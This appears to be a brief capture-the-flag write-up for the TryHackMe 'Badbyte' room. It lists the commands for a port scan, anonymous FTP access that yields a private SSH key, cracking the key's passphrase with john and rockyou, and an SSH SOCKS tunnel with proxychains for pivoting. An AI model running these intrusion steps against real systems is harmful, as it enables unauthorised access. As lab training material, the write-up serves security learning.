# Badbyte

``room link``

https://tryhackme.com/room/badbyte
---

``port scan``

```
nmap -sCV 10.10.255.29
```


found **``ssh``** on ``22`` and **``ftp``** on ``30024``


``login ftp using Anonymous``

```
ftp 10.10.231.230 -P 30024
```
found : 
- notes.txt
- id_rsa

from ``notes.txt`` found that username is ``errorcauser``


**``using john to find password``**


```
ssh2john id_rsa > rsa_hash.txt
```
```
john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

password is : ``cupcake``


---

```
ssh -i id_rsa -D 1337 errorcauser@10.10.255.29
```

```
sudo nano /etc/proxychains.conf
```
> strict_chain
> 
> proxy_dns
>
> [ProxyList]
> 
> socks5 127.0.0.1 1337













